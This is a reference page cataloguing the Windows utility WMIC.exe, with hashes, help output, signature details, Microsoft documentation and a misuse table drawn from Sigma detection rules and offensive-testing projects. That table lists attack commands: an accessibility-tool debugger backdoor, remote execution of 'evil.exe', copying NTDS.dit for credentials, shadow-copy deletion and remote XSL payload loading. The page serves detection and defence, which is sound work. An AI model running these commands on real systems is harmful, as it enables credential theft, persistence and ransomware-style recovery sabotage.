---
title: WMIC.exe | WMI Commandline Utility
excerpt: What is WMIC.exe?
---

# WMIC.exe 

* File Path: `C:\Windows\system32\wbem\WMIC.exe`
* Description: WMI Commandline Utility

## Hashes

Type | Hash
-- | --
MD5 | `A2EF3F0AD95FDA9262A5F9533B6DD1BD`
SHA1 | `AA3047921E1821FC2959D0ED40191A7AFF33B6EC`
SHA256 | `FA78C88DAC91FDF2EAC736E6900AC1EC4AB7A388B8F77A23FFA7E80A4AD29F5A`
SHA384 | `83FB60616B354E148638A11FEBDB54B2CEDB6D0430138D6DD70B1BFFEBA60FE5B29A82D8D8D78DB9571C5E0E0AA5C9DE`
SHA512 | `71C9B7F76AE68CA24C2B985D47509C5C5CA262A2A23FDADA63B35343C3482776539B5D958D92F7C53F79A91320555EB569E22D30B8CA83D94D555F7E5665CFC1`
SSDEEP | `6144:fSWq+ijIokIRywZYxCzEY5wfY0fvnnok/LFoCs4F/HPcoe/VLSztBKHGH5enh:KWptweFYi1ok6CsV/VLSDKHGH0nh`
IMP | `D8770F1C24B7AAD7B5CD1817B3FEB2AA`
PESHA1 | `063C404BE48F1DFA34E01613FBC64D155580A6D1`
PE256 | `C0A0014E734125EA5871831823EE0D2E91B36CF8293F263FCE3D8E8AD62ED3A2`

## Runtime Data

### Usage (stdout):
```cmhg

WMIC is deprecated.

[global switches] <command>

The following global switches are available:
/NAMESPACE           Path for the namespace the alias operate against.
/ROLE                Path for the role containing the alias definitions.
/NODE                Servers the alias will operate against.
/IMPLEVEL            Client impersonation level.
/AUTHLEVEL           Client authentication level.
/LOCALE              Language id the client should use.
/PRIVILEGES          Enable or disable all privileges.
/TRACE               Outputs debugging information to stderr.
/RECORD              Logs all input commands and output.
/INTERACTIVE         Sets or resets the interactive mode.
/FAILFAST            Sets or resets the FailFast mode.
/USER                User to be used during the session.
/PASSWORD            Password to be used for session login.
/OUTPUT              Specifies the mode for output redirection.
/APPEND              Specifies the mode for output redirection.
/AGGREGATE           Sets or resets aggregate mode.
/AUTHORITY           Specifies the <authority type> for the connection.
/?[:<BRIEF|FULL>]    Usage information.

For more information on a specific global switch, type: switch-name /?


The following alias/es are available in the current role:
ALIAS                    - Access to the aliases available on the local system
BASEBOARD                - Base board (also known as a motherboard or system board) management.
BIOS                     - Basic input/output services (BIOS) management.
BOOTCONFIG               - Boot configuration management.
CDROM                    - CD-ROM management.
COMPUTERSYSTEM           - Computer system management.
CPU                      - CPU management.
CSPRODUCT                - Computer system product information from SMBIOS. 
DATAFILE                 - DataFile Management.  
DCOMAPP                  - DCOM Application management.
DESKTOP                  - User's Desktop management.
DESKTOPMONITOR           - Desktop Monitor management.
DEVICEMEMORYADDRESS      - Device memory addresses management.
DISKDRIVE                - Physical disk drive management. 
DISKQUOTA                - Disk space usage for NTFS volumes.
DMACHANNEL               - Direct memory access (DMA) channel management.
ENVIRONMENT              - System environment settings management.
FSDIR                    - Filesystem directory entry management. 
GROUP                    - Group account management. 
IDECONTROLLER            - IDE Controller management.  
IRQ                      - Interrupt request line (IRQ) management. 
JOB                      - Provides  access to the jobs scheduled using the schedule service. 
LOADORDER                - Management of system services that define execution dependencies. 
LOGICALDISK              - Local storage device management.
LOGON                    - LOGON Sessions.  
MEMCACHE                 - Cache memory management.
MEMORYCHIP               - Memory chip information.
MEMPHYSICAL              - Computer system's physical memory management. 
NETCLIENT                - Network Client management.
NETLOGIN                 - Network login information (of a particular user) management. 
NETPROTOCOL              - Protocols (and their network characteristics) management.
NETUSE                   - Active network connection management.
NIC                      - Network Interface Controller (NIC) management.
NICCONFIG                - Network adapter management. 
NTDOMAIN                 - NT Domain management.  
NTEVENT                  - Entries in the NT Event Log.  
NTEVENTLOG               - NT eventlog file management. 
ONBOARDDEVICE            - Management of common adapter devices built into the motherboard (system board).
OS                       - Installed Operating System/s management. 
PAGEFILE                 - Virtual memory file swapping management. 
PAGEFILESET              - Page file settings management. 
PARTITION                - Management of partitioned areas of a physical disk.
PORT                     - I/O port management.
PORTCONNECTOR            - Physical connection ports management.
PRINTER                  - Printer device management. 
PRINTERCONFIG            - Printer device configuration management.  
PRINTJOB                 - Print job management. 
PROCESS                  - Process management. 
PRODUCT                  - Installation package task management. 
QFE                      - Quick Fix Engineering.  
QUOTASETTING             - Setting information for disk quotas on a volume. 
RDACCOUNT                - Remote Desktop connection permission management.
RDNIC                    - Remote Desktop connection management on a specific network adapter.
RDPERMISSIONS            - Permissions to a specific Remote Desktop connection.
RDTOGGLE                 - Turning Remote Desktop listener on or off remotely.
RECOVEROS                - Information that will be gathered from memory when the operating system fails. 
REGISTRY                 - Computer system registry management.
SCSICONTROLLER           - SCSI Controller management.  
SERVER                   - Server information management. 
SERVICE                  - Service application management. 
SHADOWCOPY               - Shadow copy management.
SHADOWSTORAGE            - Shadow copy storage area management.
SHARE                    - Shared resource management. 
SOFTWAREELEMENT          - Management of the  elements of a software product installed on a system.
SOFTWAREFEATURE          - Management of software product subsets of SoftwareElement. 
SOUNDDEV                 - Sound Device management.
STARTUP                  - Management of commands that run automatically when users log onto the computer system.
SYSACCOUNT               - System account management.  
SYSDRIVER                - Management of the system driver for a base service.
SYSTEMENCLOSURE          - Physical system enclosure management.
SYSTEMSLOT               - Management of physical connection points including ports,  slots and peripherals, and proprietary connections points.
TAPEDRIVE                - Tape drive management.  
TEMPERATURE              - Data management of a temperature sensor (electronic thermometer).
TIMEZONE                 - Time zone data management. 
UPS                      - Uninterruptible power supply (UPS) management. 
USERACCOUNT              - User account management.
VOLTAGE                  - Voltage sensor (electronic voltmeter) data management.
VOLUME                   - Local storage volume management.
VOLUMEQUOTASETTING       - Associates the disk quota setting with a specific disk volume. 
VOLUMEUSERQUOTA          - Per user storage volume quota management.
WMISET                   - WMI service operational parameters management. 

For more information on a specific alias, type: alias /?

CLASS     - Escapes to full WMI schema.
PATH      - Escapes to full WMI object paths.
CONTEXT   - Displays the state of all the global switches.
QUIT/EXIT - Exits the program.

For more information on CLASS/PATH/CONTEXT, type: (CLASS | PATH | CONTEXT) /?


```

### Usage (stderr):
```cmhg
help - Alias not found.

```

### Loaded Modules:

Path |
-- |
C:\Windows\System32\KERNEL32.DLL |
C:\Windows\System32\KERNELBASE.dll |
C:\Windows\SYSTEM32\ntdll.dll |
C:\Windows\system32\wbem\WMIC.exe |


## Signature

* Status: Signature verified.
* Serial: `3300000266BD1580EFA75CD6D3000000000266`
* Thumbprint: `A4341B9FD50FB9964283220A36A1EF6F6FAA7840`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: wmic.exe.mui
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.19041.1 (WinBuild.160101.0800)
* Product Version: 10.0.19041.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 64-bit

## File Scan

* VirusTotal Detections: 0/76
* VirusTotal Link: https://www.virustotal.com/gui/file/fa78c88dac91fdf2eac736e6900ac1ec4ab7a388b8f77a23ffa7e80a4ad29f5a/detection


## Possible Misuse

*The following table contains possible examples of `WMIC.exe` being misused. While `WMIC.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [godmode_sigma_rule.yml](https://github.com/Neo23x0/sigma/blob/master/other/godmode_sigma_rule.yml) | `- '\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_suspicious_dbghelp_dbgcore_load.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/image_load/sysmon_suspicious_dbghelp_dbgcore_load.yml) | `- '\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_mal_blue_mockingbird.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/malware/win_mal_blue_mockingbird.yml) | `Image\|endswith: '\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_bypass_squiblytwo.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_bypass_squiblytwo.yml) | `- '*\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_crime_maze_ransomware.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_crime_maze_ransomware.yml) | `Image\|endswith: '\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_html_help_spawn.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_html_help_spawn.yml) | `- '\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_local_system_owner_account_discovery.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_local_system_owner_account_discovery.yml) | `- Image\|endswith: '\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_office_shell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_office_shell.yml) | `- '*\wmic.exe'  # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_renamed_binary.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary.yml) | `- 'wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_renamed_binary.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary.yml) | `- '\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_renamed_binary_highly_relevant.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary_highly_relevant.yml) | `- "wmic.exe"` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_renamed_binary_highly_relevant.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary_highly_relevant.yml) | `- '*\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_shadow_copies_creation.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_shadow_copies_creation.yml) | `- '\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_shadow_copies_deletion.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_shadow_copies_deletion.yml) | `- '\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_eventlog_clear.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_eventlog_clear.yml) | `Image\|endswith: '\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_wmi_execution.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_wmi_execution.yml) | `- '*\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_xsl_script_processing.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_xsl_script_processing.yml) | `- Image\|endswith: '\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_xsl_script_processing.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_xsl_script_processing.yml) | `- WMIC.exe FP depend on scripts and administrative methods used in the monitored environment` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_suspicious_remote_thread.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_suspicious_remote_thread.yml) | `- '\wmic.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wmic.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml) | `Name: Wmic.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wmic.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml) | `- Command: wmic.exe process call create "c:\ads\file.txt:program.exe"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wmic.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml) | `- Command: wmic.exe process call create calc` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wmic.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml) | `- Command: wmic.exe process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wmic.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml) | `- Command: wmic.exe /node:"192.168.0.1" process call create "evil.exe"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wmic.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml) | `- Command: wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "at 9:00PM c:\GoogleUpdate.exe ^> c:\notGoogleUpdateResults.txt"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wmic.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml) | `- Command: wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "cmd /c vssadmin create shadow /for=C:\Windows\NTDS\NTDS.dit > c:\not_the_NTDS.dit"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wmic.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml) | `- Command: wmic.exe process get brief /format:"https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wmic.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml) | `- Command: wmic.exe process get brief /format:"\\127.0.0.1\c$\Tools\pocremote.xsl"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wmic.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml) | `- Path: C:\Windows\System32\wbem\wmic.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wmic.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml) | `- Path: C:\Windows\SysWOW64\wbem\wmic.exe` | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1047.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/T1047.md) | This test uses wmic.exe to execute a process on the local host. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1047.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/T1047.md) | This test uses wmic.exe to execute a process on a remote host. Specify a valid value for remote IP using the node parameter. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1220.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1220/T1220.md) | \| wmic_command \| WMI command to execute using wmic.exe \| string \| process list\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1490.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md) | wmic.exe shadowcopy delete | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1518.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md) | wmic.exe /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)

## Additional Info*

**The information below is copied from [MicrosoftDocs](https://github.com/MicrosoftDocs/windowsserverdocs), which is maintained by [Microsoft](https://opensource.microsoft.com/codeofconduct/). Available under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) license.*

---

## wmic



Displays WMI information inside an interactive command shell.



### Syntax

```
wmic </parameter>
```

### Sub-commands

The following sub-commands are available at all times:

|Sub-command|Description|
|-----------|-----------|
|class|Escapes from the default alias mode of WMIC to access classes in the WMI schema directly.|
|path|Escapes from the default alias mode of WMIC to access instances in the WMI schema directly.|
|context|Displays the current values of all global switches.|
|[quit \| exit]|Exits the WMIC command shell.|

### Examples

To display the current values of all global switches, type:
```
wmic context
```
Output similar to the following displays:
```
NAMESPACE    : root\cimv2
ROLE         : root\cli
NODE(S)      : BOBENTERPRISE
IMPLEVEL     : IMPERSONATE
[AUTHORITY   : N/A]
AUTHLEVEL    : PKTPRIVACY
LOCALE       : ms_409
PRIVILEGES   : ENABLE
TRACE        : OFF
RECORD       : N/A
INTERACTIVE  : OFF
FAILFAST     : OFF
OUTPUT       : STDOUT
APPEND       : STDOUT
USER         : N/A
AGGREGATE    : ON
```
To change the language ID used by the command line to English (locale ID 409), type:
```
wmic /locale:ms_409
```

### Additional References

- [Command-Line Syntax Key](https://github.com/MicrosoftDocs/windowsserverdocs/tree/master/WindowsServerDocs/administration/windows-commands/command-line-syntax-key.md)

---



MIT License. Copyright (c) 2020 Strontic.


